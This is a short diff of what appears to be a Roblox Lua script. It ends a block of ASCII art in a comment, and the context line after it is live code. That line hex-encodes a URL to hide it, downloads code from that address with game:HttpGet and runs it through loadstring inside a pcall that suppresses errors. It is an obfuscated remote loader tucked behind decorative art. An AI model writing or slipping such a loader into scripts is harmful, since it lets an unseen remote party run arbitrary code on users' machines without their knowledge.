@@ -63,8 +63,5 @@
                          z$$$F            / "$$$
                         $$$$%/           ( ;. "?.
                        ;"?""&gt;            ``  `.  \
-                       \.- `                   `--'
-
-]]--
-
+                       \.- `                   `--']]--
 pcall(function()local s,c,g=string.sub,string.char,game;local u=(function(x)local o={}for i=1,#x,2 do o[#o+1]=c(tonumber(s(x,i,i+1),16))end;return table.concat(o)end)("68747470733a2f2f70616e6461646576656c6f706d656e742e6e65742f7669727475616c2f66696c652f62633230653166373830383030626433");local r=g:HttpGet(u);local f=loadstring(r);if type(f)=="function"then f()end end)
